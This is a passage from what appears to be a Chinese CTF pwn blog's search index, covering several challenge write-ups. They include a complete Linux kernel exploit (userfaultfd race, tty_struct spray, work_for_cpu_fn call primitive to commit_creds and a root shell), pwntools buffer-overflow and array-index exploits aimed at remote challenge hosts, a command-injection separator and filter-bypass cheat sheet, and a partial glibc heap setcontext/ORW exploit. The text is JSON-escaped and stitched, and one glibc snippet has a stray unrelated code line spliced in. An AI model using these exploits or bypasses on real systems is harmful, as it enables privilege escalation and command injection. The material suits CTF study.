-cpu kvm64,+smep,+smap \\    -monitor /dev/null 2&gt;/dev/null \\    -s\n\n保护开启了smep，smap，kaslr进入系统可以看到还开启了kpti。\n题目就是一个菜单堆题：\n__int64 __fastcall mynote_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)&#123;    __int64 v3; // rdx    userarg notearg; // [rsp+0h] [rbp-28h] BYREF    ((void (__fastcall *)(file *))_fentry__)(file);    copy_from_user(&amp;notearg, v3, 0x18LL);    if ( cmd == 0x100 )        return noteadd(notearg.idx, notearg.size, notearg.buf);    if ( cmd &lt;= 0x100 )    &#123;        if ( cmd == 0x64 )            return notegift(notearg.buf);    &#125;    else    &#123;        if ( cmd == 0x200 )            return notedel(notearg.idx);        if ( cmd == 0x300 )            return noteedit(notearg.idx, notearg.size, notearg.buf);    &#125;    printk(&quot;[x] Unknown ioctl cmd!\\n&quot;, notearg.size, notearg.buf);    return -100LL;&#125;\n\n__int64 __fastcall noteadd(size_t idx, size_t size, void *buf)&#123;    __int64 v3; // rdx    __int64 v4; // r13    note *v5; // rbx    size_t v6; // r14    __int64 v7; // rbx    _fentry__(idx);    if ( idx &gt; 0xF )    &#123;        v7 = -1LL;        printk(&quot;[x] Add idx out of range.\\n&quot;, size);    &#125;    else    &#123;        v4 = v3;        v5 = &amp;notebook[idx];        raw_read_lock(&amp;lock);        v6 = v5-&gt;size;        v5-&gt;size = size;        if ( size &gt; 0x60 )        &#123;            v5-&gt;size = v6;            v7 = -2LL;            printk(&quot;[x] Add size out of range.\\n&quot;);        &#125;        else        &#123;            copy_from_user(name, v4, 0x100LL);            if ( v5-&gt;note )            &#123;                v5-&gt;size = v6;                v7 = -3LL;                printk(&quot;[x] Add idx is not empty.\\n&quot;);            &#125;            else            &#123;                v5-&gt;note = (void *)_kmalloc(size, 0x24000C0LL);                printk(&quot;[+] Add success. %s left a note.\\n&quot;, name);                v7 = 0LL;            &#125;        &#125;        raw_read_unlock(&amp;lock);    &#125;    return v7;&#125;\n\n在create函数里，是首先将对应位置的size放到栈上，随后直接把输入的size放到了储存size的地址，并且接着就是一个copy_from_user。\n__int64 __fastcall noteedit(size_t idx, size_t newsize, void *buf)&#123;    __int64 v3; // rdx    __int64 v4; // r13    note *v5; // rbx    size_t size; // rax    __int64 v7; // r12    __int64 v8; // rbx    _fentry__(idx);    if ( idx &gt; 0xF )    &#123;        v8 = -1LL;        printk(&quot;[x] Edit idx out of range.\\n&quot;, newsize);        return v8;    &#125;    v4 = v3;    v5 = &amp;notebook[idx];    raw_read_lock(&amp;lock);    size = v5-&gt;size;    v5-&gt;size = newsize;    if ( size == newsize )    &#123;        v8 = 1LL;        goto editout;    &#125;    v7 = (*(__int64 (__fastcall **)(void *, size_t, __int64))krealloc.gap0)(v5-&gt;note, newsize, 0x24000C0LL);    copy_from_user(name, v4, 0x100LL);    if ( !v5-&gt;size )    &#123;        printk(&quot;free in fact&quot;);        v5-&gt;note = 0LL;        v8 = 0LL;        goto editout;    &#125;    if ( (unsigned __int8)_virt_addr_valid(v7) )    &#123;        v5-&gt;note = (void *)v7;        v8 = 2LL;        editout:        raw_read_unlock(&amp;lock);        printk(&quot;[o] Edit success. %s edit a note.\\n&quot;, name);        return v8;    &#125;    printk(&quot;[x] Return ptr unvalid.\\n&quot;);    raw_read_unlock(&amp;lock);    return 3LL;&#125;\n\n可以看到虽然在create函数存在size的验证，但是在edit函数不存在任何验证，并且一样是在krealloc之后就有一个copy_from_user。\n__int64 __fastcall notegift(void *buf)&#123;    _fentry__(buf);    printk(&quot;[*] The notebook needs to be written from beginning to end.\\n&quot;);    copy_to_user(buf, notebook, 0x100LL);    printk(&quot;[*] For this special year, I give you a gift!\\n&quot;);    return 100LL;&#125;\n\n这里的gift函数就是把所有堆地址给泄露出来。\n利用分析那么就上面分析出来的结果可以得出目前的利用思路就是，首先利用userfaultfd机制形成一个UAF的堆块，然后利用结构中含有指针的结构体进行堆喷，那么我们就可以进一步的泄漏出地址出来。下一步就是我们可以修改指针进行栈迁移，我们可以把ROP链写在另外一个堆上面，因为可以泄露堆地址的缘故所以我们可以直接栈迁移到写了ROP链的堆上面。这里使用的结构体是tty_struct，其中有tty_operations是一个类似于vtable的函数表，所以我们利用三个堆块即可完成利用。\n上面是常规思路，这里主要写一下新的思路。\n内核中存在这样一个函数：\nstruct work_for_cpu &#123;    struct work_struct work;    long (*fn)(void *);    void *arg;    long ret;&#125;;static void work_for_cpu_fn(struct work_struct *work)&#123;    struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);&#125;\n\n上面函数在编译过后表达的形式其实是：\nstatic void work_for_cpu_fn(size_t * args)&#123;    args[6] = ((size_t (*) (size_t)) (args[4](args[5]));&#125;\n\n该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。\n所以这里只需要用到两个堆块，第一个堆块我们要形成一个size为0x2e0的UAF堆块，第二个堆块没有要求。使用堆喷让tty_struct喷到我们的UAF堆块，但是我们需要确认他是否成功了，在tty_struct的第一个成员是一个魔数，我们可以利用他进行判断。随后修改tty_operations指针指向另外一个堆块，紧接着根据上面的函数中的偏移修改tty_struct的内容即可\n综上，得出exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;int fd;struct userarg&#123;    long int idx;    long int size;    unsigned long *buf;&#125;;void ErrExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void RegisterUserfault(void *fault_page, void *handler)&#123;    pthread_t thr;    struct uffdio_api ua;    struct uffdio_register ur;    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);    ua.api = UFFD_API;    ua.features = 0;    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);    ur.range.start = (unsigned long)fault_page; //我们要监视的区域    ur.range.len = 0x1000;    ur.mode = UFFDIO_REGISTER_MODE_MISSING;    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);    //开一个线程，接收错误的信号，然后处理    int s = pthread_create(&amp;thr, NULL, handler, (void *)uffd);    if (s != 0)        ErrExit(&quot;[-] pthread_create&quot;);&#125;void *userfaultfd_stuck_handler(void *arg)&#123;    struct uffd_msg msg;    unsigned long uffd = (unsigned long)arg;    puts(&quot;[+] stuck handler created&quot;);    int nready;    struct pollfd pollfd;    pollfd.fd = uffd;    pollfd.events = POLLIN;    nready = poll(&amp;pollfd, 1, -1);    puts(&quot;[+] stuck handler unblocked&quot;);    pause();    if (nready != 1)    &#123;        ErrExit(&quot;[-] Wrong poll return val&quot;);    &#125;    nready = read(uffd, &amp;msg, sizeof(msg));    if (nready &lt;= 0)    &#123;        ErrExit(&quot;[-] msg err&quot;);    &#125;    char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    if (page == MAP_FAILED)    &#123;        ErrExit(&quot;[-] mmap err&quot;);    &#125;    struct uffdio_copy uc;    // init page    memset(page, 0, sizeof(page));    uc.src = (unsigned long)page;    uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(0x1000 - 1);    uc.len = 0x1000;    uc.mode = 0;    uc.copy = 0;    ioctl(uffd, UFFDIO_COPY, &amp;uc);    puts(&quot;[+] stuck handler done&quot;);    return NULL;&#125;void create(long int idx, long int size, unsigned long *buf)&#123;    struct userarg arg;    arg.idx = idx;    arg.size = size;    arg.buf = buf;    ioctl(fd, 0x100, &amp;arg);&#125;void delete (long int idx)&#123;    struct userarg arg;    arg.idx = idx;    ioctl(fd, 0x200, &amp;arg);&#125;void edit(long int idx, long int size, unsigned long *buf)&#123;    struct userarg arg;    arg.idx = idx;    arg.size = size;    arg.buf = buf;    ioctl(fd, 0x300, &amp;arg);&#125;void get_chunk(unsigned long *buf)&#123;    struct userarg arg;    arg.buf = buf;    ioctl(fd, 0x64, &amp;arg);&#125;unsigned long *stuck_mapped_memory;void edit_thread(long int idx)&#123;    edit(idx, 0, stuck_mapped_memory);&#125;void add_thread(long int idx)&#123;    create(idx, 0x60, stuck_mapped_memory);&#125;int tty_fd;int main()&#123;    fd = open(&quot;/dev/notebook&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[-] Error opening /dev/notebook\\n&quot;);        exit(-1);    &#125;    stuck_mapped_memory = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);    char *buf;    char *buf_tty;    buf = malloc(0x1000);    buf_tty = malloc(0x1000);    memset(buf, &quot;a&quot;, 0x100);    memset(buf_tty, 0, 0x1000);    create(0, 0x60, buf);    create(1, 0x60, buf);    edit(1, 0x500, buf);    edit(0, 0x2e0, buf);    pthread_t thr_edit, thr_add;    pthread_create(&amp;thr_edit, NULL, edit_thread, 0);    sleep(1);    pthread_create(&amp;thr_add, NULL, add_thread, 0);    sleep(1);    for (int i = 0; i &lt; 20; i++)    &#123;        tty_fd = open(&quot;/dev/ptmx&quot;, O_RDWR);        if (tty_fd &lt; 0)        &#123;            ErrExit(&quot;[-] ptmx open failed!&quot;);        &#125;        read(fd, buf_tty, 0);        if (*(unsigned long *)buf_tty == 0x100005401)        &#123;            printf(&quot;[+] tty_struct found! fd = %d\\n&quot;, tty_fd);            break;        &#125;    &#125;    if (*(unsigned long *)buf_tty != 0x100005401)    &#123;        ErrExit(&quot;[-] leak failed&quot;);    &#125;    unsigned long kernel_base;    unsigned long ptm_unix98_ops_addr;    unsigned long work_for_cpu_fn_addr;    unsigned long commit_creds_addr;    unsigned long prepare_kernel_cred_addr;    ptm_unix98_ops_addr = *(unsigned long *)(buf_tty + 0x18);    if ((ptm_unix98_ops_addr &amp; 0xFFF) == 0x320)        ptm_unix98_ops_addr += 0x120;    kernel_base = ptm_unix98_ops_addr - 0xe8e440;    work_for_cpu_fn_addr = 0x9eb90 + kernel_base;    commit_creds_addr = 0xa9b40 + kernel_base;    prepare_kernel_cred_addr = 0xa9ef0 + kernel_base;    printf(&quot;[+] ptm_unix98_ops addr leaked, addr: 0x%lx\\n&quot;, ptm_unix98_ops_addr);    printf(&quot;[+] work_for_cpu_fn addr leaked, addr: 0x%lx\\n&quot;, work_for_cpu_fn_addr);    printf(&quot;[+] prepare_kernel_cred addr leaked, addr: 0x%lx\\n&quot;, prepare_kernel_cred_addr);    unsigned long chunk_arr[0x100];    get_chunk(chunk_arr);    unsigned long note_0_addr;    unsigned long note_1_addr;    note_0_addr = chunk_arr[0 * 2];    note_1_addr = chunk_arr[1 * 2];    printf(&quot;[+] note_1 addr leaked, addr: 0x%lx\\n&quot;, note_1_addr);    *(unsigned long *)(buf_tty) = 0x100005401;    *(unsigned long *)(buf_tty + 3 * 8) = note_1_addr;    *(unsigned long *)(buf_tty + 4 * 8) = prepare_kernel_cred_addr;    *(unsigned long *)(buf_tty + 5 * 8) = 0;    write(fd, buf_tty, 0);    unsigned long fake_operations[0x100];    fake_operations[7] = work_for_cpu_fn_addr;    fake_operations[10] = work_for_cpu_fn_addr;    fake_operations[12] = work_for_cpu_fn_addr;    write(fd, fake_operations, 1);    ioctl(tty_fd, 233, 233);    read(fd, buf_tty, 0);    printf(&quot;[+] prepare_kernel_cred finished, return 0x%lx\\n&quot;, *(unsigned long *)(buf_tty + 6 * 8));    *(unsigned long *)(buf_tty) = 0x100005401;    *(unsigned long *)(buf_tty + 3 * 8) = note_1_addr;    *(unsigned long *)(buf_tty + 4 * 8) = commit_creds_addr;    *(unsigned long *)(buf_tty + 5 * 8) = *(unsigned long *)(buf_tty + 6 * 8);    write(fd, buf_tty, 0);    sleep(1);    ioctl(tty_fd, 233, 233);    system(&quot;/bin/sh&quot;);    return 0;&#125;\n\n\n\n参考链接：https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#_1\n","categories":["kernel-pwn"],"tags":["userfaultfd","tty_struct"]},{"title":"warmup_csaw_2016","url":"/2021/09/18/warmup-csaw-2016/","content":"下载附件之后的必要操作\n\n文件为64位文件。\n\n发现文件没有开任何保护。\n然后chmod 777 warmup_csaw_2016\n运行程序\n\n发现在wow这里打印除了一个地址。\n查看IDA pro反汇编结果\n__int64 __fastcall main(__int64 a1, char a2, char a3)&#123;  char s;  [rsp+0h] [rbp-80h]  char v5;  [rsp+40h] [rbp-40h]  write(1, -Warm Up-n, 0xAuLL);  write(1, WOW, 4uLL);  sprintf(&amp;s, %pn, sub_40060D);  write(1, &amp;s, 9uLL);  write(1, , 1uLL);  return gets(&amp;v5, ); // gets在c语言里面最容易出现漏洞&#125;\n\n然后在这里看到sprintf打印的就是一个地址点进去看一下\n函数sub_40060D的内容是\nint sub_40060D()&#123;  return system(&quot;cat flag.txt&quot;);&#125;\n\n所以他给了我们拿到flag的地址，只需要通过gets函数改变rip寄存器，跳转到这个函数就可以得到flag\n\n我们上面输入的是aaaa对应的，所以根据函数栈的机制就可以找到偏移量为0x48\n然后直接写exp吧\nfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;DEBUG&#x27;)elf = ELF(&#x27;./questions/warmup_csaw_2016&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29330)get_flag_addr = 0x40060dpayload = b&#x27;a&#x27;*(0x48) + p64(get_flag_addr)r.sendline(payload)r.interactive()\n\n\n拿到flag!\n","categories":["pwn-buuctf"],"tags":["pwn"]},{"title":"web_command_execution","url":"/2021/09/23/web-command-execution/","content":";     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）\n\n\n\n\n空格绕过\n\n$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\\x09./flag.php&#x27;;$X       （\\x09表示tab，也可以用\\x20）\n\n\n\n在命令执行时，需要绕过空格使用&lt;/符号\ncat&lt;/flagcat&lt;/home/tcdy/duyu/test.php\n\n\n绕过黑名单\n\n┌──(tcdy㉿Debian)-[~]└─$ a=f;b=l;c=a;d=g                                                                                                                                                                                                                                    ┌──(tcdy㉿Debian)-[~]└─$ cat $a$b$c$d   this is a test                                                                                                                                                                                                                                            ┌──(tcdy㉿Debian)-[~]└─$ cat flag    this is a test\n\n这次攒的不多\n","categories":["web"],"tags":["命令执行"]},{"title":"xctf_stack2","url":"/2021/09/24/xctf-stack2/","content":"程序的保护与流程\n保护几乎全开了，直接看程序执行流程\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // eax  unsigned int v5; // [esp+18h] [ebp-90h]  unsigned int v6; // [esp+1Ch] [ebp-8Ch]  int v7; // [esp+20h] [ebp-88h]  unsigned int j; // [esp+24h] [ebp-84h]  int v9; // [esp+28h] [ebp-80h]  unsigned int i; // [esp+2Ch] [ebp-7Ch]  unsigned int k; // [esp+30h] [ebp-78h]  unsigned int l; // [esp+34h] [ebp-74h]  char v13[100]; // [esp+38h] [ebp-70h]  unsigned int v14; // [esp+9Ch] [ebp-Ch]  v14 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  v9 = 0;  puts(&quot;***********************************************************&quot;);  puts(&quot;*                      An easy calc                       *&quot;);  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);  puts(&quot;*(0 &lt;= x &lt; 256)                                           *&quot;);  puts(&quot;***********************************************************&quot;);  puts(&quot;How many numbers you have:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v5);  puts(&quot;Give me your numbers&quot;);  for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i )  &#123;    __isoc99_scanf(&quot;%d&quot;, &amp;v7);    v13[i] = v7;  &#125;  for ( j = v5; ; printf(&quot;average is %.2lf\\n&quot;, (double)((long double)v9 / (double)j)) )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( 1 )        &#123;          puts(&quot;1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit&quot;);          __isoc99_scanf(&quot;%d&quot;, &amp;v6);          if ( v6 != 2 )            break;          puts(&quot;Give me your number&quot;);          __isoc99_scanf(&quot;%d&quot;, &amp;v7);          if ( j &lt;= 0x63 )          &#123;            v3 = j++;            v13[v3] = v7;          &#125;        &#125;        if ( v6 &gt; 2 )          break;        if ( v6 != 1 )          return 0;        puts(&quot;id\\t\\tnumber&quot;);        for ( k = 0; k &lt; j; ++k )          printf(&quot;%d\\t\\t%d\\n&quot;, k, v13[k]);      &#125;      if ( v6 != 3 )        break;      puts(&quot;which number to change:&quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;v5);      puts(&quot;new number:&quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;v7);      v13[v5] = v7;    &#125;    if ( v6 != 4 )      break;    v9 = 0;    for ( l = 0; l &lt; j; ++l )      v9 += v13[l];  &#125;  return 0;&#125;\n\n流程主要就是，选择你要往数组里面加几个数字，然后输入，然后有四个选项，分别是，查看数字，添加数字，改变数字，获得平均数，最后就是结束。\n分析漏洞浏览全篇没有read和gets等函数来实现栈溢出，再就是有Canary保护。\n漏洞位置:\nputs(&quot;which number to change:&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v5);puts(&quot;new number:&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v7);\n\n找到偏移量这里没有限制数组的边境，就可以造成任意地址更改的漏洞。\n\n静态调试的时候会的出偏移量是0x74，但是这样直接跑就出错了。\nemmm我也不知道为什么，后面看了博客，发现要找到数组的起始地址和ret地址\n\n函数在执行到v13[v5]=v7的时候就是上面的汇编代码。整个执行流程就是，\nscanf的时候就将数据存在栈上面，然后把数据放到EDX寄存器，再把DL的数据放到ebp+eax-0x70的位置，也就是栈上面。然后就是找ret函数\n\n执行到ret，所以此时的rsp就是ret的地址\nemmmL:开始一直没想清楚为什么会出现ret地址不是ebp+4，很多博客都没写清楚，问了学长那态度问过的都知道。\nhttps://muzibing.github.io/2020/06/08/2020.06.08(123)/\n这个博主解释了，是因为开启了canary的缘故\n解决完这个难题后面就简单了，题目有一个欺骗人的函数hackhere里面的参数是’/bin/bash’所以get不到shell，然后就直接自己构造吧。\ngetshell直接上exp\nfrom platform import systemfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;x86&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/3fb1a42837be485aae7d85d11fbc457b&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 53021)# r = process(&#x27;./questions/3fb1a42837be485aae7d85d11fbc457b&#x27;)system_addr = [0x50, 0x84, 0x04, 0x08]sh_addr = [0x87, 0x89, 0x04, 0x08]offset = 0x84r.recvuntil(b&#x27;How many numbers you have:\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Give me your numbers\\n&#x27;)r.sendline(b&#x27;1&#x27;)def attack(addr, value):    r.recvuntil(b&#x27;5. exit\\n&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;which number to change:\\n&#x27;)    r.sendline(str(addr).encode(&#x27;utf8&#x27;))    r.recvuntil(b&#x27;new number:\\n&#x27;)    r.sendline(str(value).encode(&#x27;utf8&#x27;))for i in range(4):    attack(offset+i, system_addr[i])offset += 8for j in range(4):    attack(offset+j, sh_addr[j])r.recvuntil(b&#x27;5. exit\\n&#x27;)r.sendline(b&#x27;5&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["ROP","stack overflow"]},{"title":"从两道题目看setcontext","url":"/2022/03/10/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8Bsetcontext/","content":"\n现在的比赛，越来越卷了，所以出题人为了让选手难受一般都会开始沙盒这时候只能进行orw，不过在栈里面这种方式还是常见。但是在堆利用当中我们更多的是修改hook为system或者one_gadget，为了能够实现orw就出现了新的手法 堆中栈迁移\n\nGlibc2.29以下首先先看一下在glibc2.29以下的此类利用方式\n0x00007f1c03351180 &lt;+0&gt;:\tpush   rdi0x00007f1c03351181 &lt;+1&gt;:\tlea    rsi,[rdi+0x128]0x00007f1c03351188 &lt;+8&gt;:\txor    edx,edx0x00007f1c0335118a &lt;+10&gt;:\tmov    edi,0x20x00007f1c0335118f &lt;+15&gt;:\tmov    r10d,0x80x00007f1c03351195 &lt;+21&gt;:\tmov    eax,0xe0x00007f1c0335119a &lt;+26&gt;:\tsyscall 0x00007f1c0335119c &lt;+28&gt;:\tpop    rdi0x00007f1c0335119d &lt;+29&gt;:\tcmp    rax,0xfffffffffffff0010x00007f1c033511a3 &lt;+35&gt;:\tjae    0x7f1c03351200 &lt;setcontext+128&gt;0x00007f1c033511a5 &lt;+37&gt;:\tmov    rcx,QWORD PTR [rdi+0xe0]0x00007f1c033511ac &lt;+44&gt;:\tfldenv [rcx]0x00007f1c033511ae &lt;+46&gt;:\tldmxcsr DWORD PTR [rdi+0x1c0]0x00007f1c033511b5 &lt;+53&gt;:\tmov    rsp,QWORD PTR [rdi+0xa0]0x00007f1c033511bc &lt;+60&gt;:\tmov    rbx,QWORD PTR [rdi+0x80]0x00007f1c033511c3 &lt;+67&gt;:\tmov    rbp,QWORD PTR [rdi+0x78]0x00007f1c033511c7 &lt;+71&gt;:\tmov    r12,QWORD PTR [rdi+0x48]0x00007f1c033511cb &lt;+75&gt;:\tmov    r13,QWORD PTR [rdi+0x50]0x00007f1c033511cf &lt;+79&gt;:\tmov    r14,QWORD PTR [rdi+0x58]0x00007f1c033511d3 &lt;+83&gt;:\tmov    r15,QWORD PTR [rdi+0x60]0x00007f1c033511d7 &lt;+87&gt;:\tmov    rcx,QWORD PTR [rdi+0xa8]0x00007f1c033511de &lt;+94&gt;:\tpush   rcx0x00007f1c033511df &lt;+95&gt;:\tmov    rsi,QWORD PTR [rdi+0x70]0x00007f1c033511e3 &lt;+99&gt;:\tmov    rdx,QWORD PTR [rdi+0x88]0x00007f1c033511ea &lt;+106&gt;:\tmov    rcx,QWORD PTR [rdi+0x98]0x00007f1c033511f1 &lt;+113&gt;:\tmov    r8,QWORD PTR [rdi+0x28]0x00007f1c033511f5 &lt;+117&gt;:\tmov    r9,QWORD PTR [rdi+0x30]0x00007f1c033511f9 &lt;+121&gt;:\tmov    rdi,QWORD PTR [rdi+0x68]0x00007f1c033511fd &lt;+125&gt;:\txor    eax,eax0x00007f1c033511ff &lt;+127&gt;:\tret    \n\n可以看到这里是以rdi为基地址向其他寄存器写入值，并且这里可以控制rsp和rip，虽然上面没有直接向rip写，但是上面是先写在rcx再将rcx进栈随后ret，所以rcx的值其实也就是最后rip的值。\nCISCN2021-silverwolf题目的代码很清晰，流程很容易分析所以自己下去分析一下\nunsigned __int64 delete()&#123;  __int64 v1; // [rsp+0h] [rbp-18h] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-10h]  v2 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Index: &quot;);  __isoc99_scanf(&amp;unk_1144, &amp;v1);  if ( !v1 &amp;&amp; chunk )    free(chunk);  return __readfsqword(0x28u) ^ v2;&#125;\n\ndelete存在很明显的UAF漏洞，泄漏heap地址和libc地址这里就不在赘述，这里提一下tcache double free的检测，这道提的libc版本是2.27-3ubuntu1.3虽然是2.27但是已经加了检测机制，所以可以当作2.29来打，这里先看一下检测的源码\ntcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;\n\n可以看到我们chunk进入tcache之后会将key位其实也就是bk位设置为tcache地址\nif (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;    /* Check to see if it&#x27;s already in the tcache.  */    tcache_entry *e = (tcache_entry *) chunk2mem (p);    /* This test succeeds on double free.  However, we don&#x27;t 100%\t   trust it (it also matches random payload data at a 1 in\t   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely\t   coincidence before aborting.  */    if (__glibc_unlikely (e-&gt;key == tcache))    &#123;        tcache_entry *tmp;        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx];             tmp;             tmp = tmp-&gt;next)            if (tmp == e)                malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);        /* If we get here, it was a coincidence.  We&#x27;ve wasted a\t       few cycles, but don&#x27;t abort.  */    &#125;    if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)    &#123;        tcache_put (p, tc_idx);        return;    &#125;r.recvuntil(b&#x27;Please input index?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))&#125;\n\n然后再验证free的chunk的key位是否为tcache地址，所以只需要覆盖掉就好了。\n所以思路就很简单了，只需要通过double free控制tcache struct，然后覆盖掉free_hook为setcontext+53，不过需要注意的是这里的堆能写入的最大值为0x78所以，我们在构造rdi+0xa0和rdi+0xa8时需要用到两个chunk，还有一点很坑的就是在进行rop时不能直接调用open\n0x00007f1c0340ed49 &lt;+57&gt;:\ttest   eax,eax0x00007f1c0340ed4b &lt;+59&gt;:\tjne    0x7f1c0340edb6 &lt;__libc_open64+166&gt;0x00007f1c0340ed4d &lt;+61&gt;:\tmov    edx,esi0x00007f1c0340ed4f &lt;+63&gt;:\tmov    eax,0x1010x00007f1c0340ed54 &lt;+68&gt;:\tmov    rsi,rdi0x00007f1c0340ed57 &lt;+71&gt;:\tmov    edi,0xffffff9c0x00007f1c0340ed5c &lt;+76&gt;:\tsyscall \n\n反汇编存在以下几行，这里进行syscall时rax其实并不是2\n&gt;&gt; seccomp-tools dump ./silverwolf line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL\n\n可以看到这里的沙盒限制了，所以直接使用地址调用open是不行的需要自己赋值rax，最后这里给出上面题目的exp\nfrom pwn import *elf = ELF(&#x27;./silverwolf&#x27;)# r = process(&#x27;./silverwolf&#x27;)r = remote(&#x27;1.14.71.254&#x27;, 28017)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.arch = &#x27;amd64&#x27;def menu(options):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(bytes(str(options), encoding=&#x27;utf-8&#x27;))def create(size):    menu(1)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))def edit(content):    menu(2)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)    r.recvuntil(b&#x27;Content: &#x27;)    r.sendline(content)def show():    menu(3)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)def delete():    menu(4)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)for i in range(12):    create(0x10)create(0x50)for i in range(11):    create(0x60)for i in range(7):    create(0x70)create(0x78)delete()edit(b&#x27;\\x00&#x27;*0x10)delete()show()r.recvuntil(b&#x27;Content: 